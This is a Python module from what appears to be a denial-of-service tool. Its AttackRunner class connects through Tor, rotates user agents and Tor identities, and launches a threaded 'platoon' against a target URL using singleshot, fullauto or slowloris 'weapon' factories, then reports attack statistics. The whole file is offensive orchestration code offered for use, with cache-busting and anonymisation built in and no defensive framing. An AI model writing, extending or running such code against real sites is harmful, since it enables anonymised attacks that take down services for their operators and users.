"""AttackRunner module for orchestrating complete attack flows.

This module provides the AttackRunner class which encapsulates the complete attack
orchestration flow previously scattered across main.py. The runner coordinates all
components (TorClient, NetworkClient, PreFlightValidator, Platoon, SummaryReporter)
and provides a single run() method for execution.

Usage Example:
    >>> from app.runner import AttackRunner
    >>> from app.models import AttackConfig
    >>>
    >>> config = AttackConfig(
    ...     mode='singleshot',
    ...     target='https://example.com',
    ...     num_threads=10
    ... )
    >>> runner = AttackRunner(config)
    >>> runner.run()
    # Attack runs with full orchestration and reporting

The runner handles the full lifecycle:
- Tor connection setup
- Pre-flight validation
- Weapon factory creation
- Attack execution within proxy_scope()
- Graceful shutdown on Ctrl-C
- Summary reporting
"""

from typing import Optional

import app.console
from app.tor import TorClient, ConnectionErrorException
from app.net import NetworkClient, RequestException
from app.command import Platoon
from app.preflight import PreFlightValidator
from app.reporter import SummaryReporter
from app.models import AttackConfig, AttackSummary
from app.weapons.singleshot import SingleShotFactory
from app.weapons.fullauto import FullAutoFactory
from app.weapons.slowloris import SlowLorisFactory


class AttackRunner:
    """Orchestrates complete attack execution flow.

    The AttackRunner class encapsulates the complete attack orchestration,
    coordinating all components from initialization through cleanup. It accepts
    an AttackConfig dataclass and handles the full attack lifecycle.

    Core Responsibilities:
    - TorClient connection establishment and management
    - Pre-flight validation of attack prerequisites
    - Weapon factory creation based on attack mode
    - Platoon instantiation and attack execution
    - Monitor summary retrieval and display
    - Graceful shutdown on interruption
    - Resource cleanup (Tor connection, console)

    Dependency Injection:
    The constructor accepts optional dependency injections for testing purposes.
    When dependencies are not provided, the runner creates default instances.

    Orchestration Steps (run() method):
    1. Initialize TorClient and establish connection
    2. Run pre-flight validation
    3. Enter Tor proxy scope context manager
    4. Initialize NetworkClient and rotate user agent
    5. Create appropriate weapon factory based on mode
    6. Create and start Platoon with soldiers
    7. Retrieve and display attack summary
    8. Cleanup resources

    Attributes:
        _config: AttackConfig containing attack parameters
        _tor_client: TorClient instance for Tor network operations
        _network_client: NetworkClient for HTTP requests
        _platoon: Platoon instance managing soldier threads
        _preflight_validator: PreFlightValidator for pre-attack checks
        _summary_reporter: SummaryReporter for final statistics display
        _is_running: Flag indicating if attack is currently running
    """

    def __init__(
        self,
        config: AttackConfig,
        tor_client: Optional[TorClient] = None,
        network_client: Optional[NetworkClient] = None,
        preflight_validator: Optional[PreFlightValidator] = None,
        summary_reporter: Optional[SummaryReporter] = None
    ):
        """Initialize the AttackRunner with configuration and optional dependencies.

        Args:
            config: AttackConfig containing all attack parameters
            tor_client: Optional TorClient instance for dependency injection
            network_client: Optional NetworkClient instance for dependency injection
            preflight_validator: Optional PreFlightValidator for dependency injection
            summary_reporter: Optional SummaryReporter for dependency injection
        """
        self._config = config
        self._tor_client = tor_client
        self._network_client = network_client
        self._preflight_validator = preflight_validator
        self._summary_reporter = summary_reporter
        self._platoon: Optional[Platoon] = None
        self._is_running = False

    def run(self) -> bool:
        """Execute the complete attack orchestration flow.

        This method coordinates all components through the full attack lifecycle:
        Tor connection, validation, proxy scoping, weapon creation, attack execution,
        summary retrieval, and cleanup.

        Returns:
            True if attack completed successfully, False if validation failed
            or an error occurred.

        Raises:
            ConnectionErrorException: If TorClient connection fails
            RequestException: If NetworkClient operations fail
            Exception: For unexpected errors during attack

        Example:
            >>> config = AttackConfig(mode='singleshot', target='https://example.com')
            >>> runner = AttackRunner(config)
            >>> success = runner.run()
            >>> print(f"Attack completed: {success}")
        """
        try:
            # Step 1: Initialize TorClient
            if self._tor_client is None:
                self._tor_client = TorClient()

            try:
                self._tor_client.connect(
                    address=self._config.tor_address,
                    proxy_port=self._config.tor_proxy_port,
                    ctrl_port=self._config.tor_ctrl_port
                )
                app.console.system(
                    f"Connected to Tor at {self._config.tor_address}:"
                    f"{self._config.tor_proxy_port} (control port: {self._config.tor_ctrl_port})"
                )
            except ConnectionErrorException as ex:
                app.console.error(f"Failed to connect to Tor: {str(ex)}")
                return False

            # Step 2: Run Pre-Flight Validation
            if self._preflight_validator is None:
                self._preflight_validator = PreFlightValidator()

            if not self._preflight_validator.validate(self._tor_client, self._config):
                app.console.error("Pre-flight validation failed - aborting attack")
                return False

            # Step 3: Enter Tor Proxy Scope
            with self._tor_client.proxy_scope():
                # Step 4: Initialize NetworkClient
                if self._network_client is None:
                    self._network_client = NetworkClient()

                self._network_client.rotate_user_agent()
                user_agent = self._network_client.get_user_agent()
                app.console.system(f"User Agent: {user_agent}")

                # Step 5: Create Weapon Factory
                weapon_factory = self._create_weapon_factory()

                # Step 6: Create and Start Platoon
                self._platoon = Platoon(
                    num_soldiers=self._config.num_threads,
                    tor_client=self._tor_client,
                    network_client=self._network_client,
                    identity_rotation_interval=self._config.identity_rotation_interval,
                    mode=self._config.mode,
                )

                self._is_running = True
                try:
                    self._platoon.attack(
                        target_url=self._config.target,
                        weapon_factory=weapon_factory
                    )
                except KeyboardInterrupt:
                    app.console.log("KeyboardInterrupt received - stopping attack")
                    self._platoon.hold_fire()
                    return False

            # Step 7: Retrieve and Display Summary
            summary = self._platoon._monitor.get_summary()

            if self._summary_reporter is None:
                self._summary_reporter = SummaryReporter()

            self._summary_reporter.display(summary)

            return True

        except ConnectionErrorException as ex:
            app.console.error(f"Tor connection error during attack: {str(ex)}")
            return False
        except RequestException as ex:
            app.console.error(f"Network request error during attack: {str(ex)}")
            return False
        except Exception as ex:
            app.console.error(f"Unexpected error during attack: {str(ex)}")
            return False
        finally:
            # Step 8: Cleanup
            # If attack is still running, stop the platoon first
            if self._is_running and self._platoon is not None:
                self._platoon.hold_fire()
            self._is_running = False
            if self._tor_client is not None:
                self._tor_client.close()
            app.console.shutdown()

    def stop(self) -> None:
        """Stop the attack gracefully.

        This method signals the platoon to hold fire, stopping all soldier
        threads and their weapons. It can be called from signal handlers (e.g.,
        Ctrl-C) to interrupt an ongoing attack.

        Example:
            >>> runner = AttackRunner(config)
            >>> # In signal handler:
            >>> runner.stop()
        """
        if self._platoon is not None:
            self._platoon.hold_fire()
        self._is_running = False

    def _create_weapon_factory(self):
        """Create the appropriate weapon factory based on attack mode.

        Returns:
            WeaponFactory instance configured for the attack mode

        Raises:
            ValueError: If the attack mode is not recognized
        """
        mode = self._config.mode

        if mode == 'singleshot':
            return SingleShotFactory(
                http_method=self._config.http_method,
                cache_buster=self._config.cache_buster
            )
        elif mode == 'fullauto':
            return FullAutoFactory(
                http_method=self._config.http_method,
                cache_buster=self._config.cache_buster,
                max_urls=self._config.fullauto_max_urls,
                max_time_seconds=self._config.fullauto_max_time
            )
        elif mode == 'slowloris':
            return SlowLorisFactory(
                http_method=self._config.http_method,
                cache_buster=self._config.cache_buster,
                num_sockets=self._config.slowloris_num_sockets
            )
        else:
            raise ValueError(f"Unknown attack mode: {mode}")
